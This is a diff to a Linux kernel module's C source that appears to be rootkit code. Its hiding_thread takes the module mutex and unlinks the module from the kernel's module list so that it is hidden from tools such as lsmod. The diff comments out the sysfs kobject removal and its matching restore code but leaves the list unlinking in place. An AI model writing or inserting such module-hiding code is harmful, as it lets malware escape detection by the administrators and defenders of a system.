@@ -5,6 +5,7 @@
 #include<linux/list.h>
 #include<linux/string.h>
 #include<linux/sysfs.h>
+#include<../fs/sysfs/sysfs.h>
 #include<linux/moduleparam.h>
 #include<linux/dynamic_debug.h>
 #include<linux/kobject.h>
@@ -27,6 +28,7 @@ static int my_delete_module(const char * name, int flags){
 }
 
 static int hiding_thread(void * data){
+	
 	mutex_lock(&module_mutex);
 	printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");
 		
@@ -38,11 +40,11 @@ static int hiding_thread(void * data){
 	tmp_head = THIS_MODULE->list.prev;	
 	list_del(&THIS_MODULE->list);
 		
-	tmp_kobj = THIS_MODULE->mkobj.kobj;
-	kobject_del(&THIS_MODULE->mkobj.kobj);
+	//tmp_kobj = THIS_MODULE->mkobj.kobj;
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
 	//TODO save pointers maybe?
-	THIS_MODULE->sect_attrs = NULL;
-	THIS_MODULE->notes_attrs = NULL;
+	//THIS_MODULE->sect_attrs = NULL;
+	//THIS_MODULE->notes_attrs = NULL;
 	
 	mutex_unlock(&module_mutex);
 
@@ -55,8 +57,8 @@ void hide_code(void){
 }
 
 void make_module_removable(void){
-	THIS_MODULE->mkobj.kobj = tmp_kobj;
-	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "&s", THIS_MODULE->mkobj.kobj.name);
+	//THIS_MODULE->mkobj.kobj = tmp_kobj;
+	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "%s", THIS_MODULE->mkobj.kobj.name);
 }
 
 void unhide_code(void) {
